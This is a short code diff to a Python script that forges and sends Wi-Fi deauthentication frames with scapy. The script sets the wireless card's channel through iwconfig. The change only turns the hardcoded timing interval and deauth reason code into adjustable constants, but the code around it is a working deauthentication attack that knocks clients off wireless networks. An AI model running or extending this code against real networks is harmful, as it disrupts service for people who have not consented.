@@ -18,6 +18,10 @@ os.system(f'iwconfig {interface} channel {channel}')
 STATE = True
 START_TIME = time.time()
 
+#### Adjustable Constant ####
+INTERVAL = 120
+REASON = 7
+
 def deauth(pkt):
     global STATE, START_TIME
     if STATE:
@@ -26,9 +30,9 @@ def deauth(pkt):
                 addr1=pkt.addr2,
                 addr2=pkt.addr3,
                 addr3=pkt.addr3)
-            frame = scapy.layers.dot11.RadioTap()/dot11/scapy.layers.dot11.Dot11Deauth(reason=2)
+            frame = scapy.layers.dot11.RadioTap()/dot11/scapy.layers.dot11.Dot11Deauth(reason=REASON)
             sendp(frame, iface=interface, count=1)
-    if time.time() - START_TIME >= 120:
+    if time.time() - START_TIME >= INTERVAL:
         START_TIME = time.time()
         if STATE:
             STATE = False
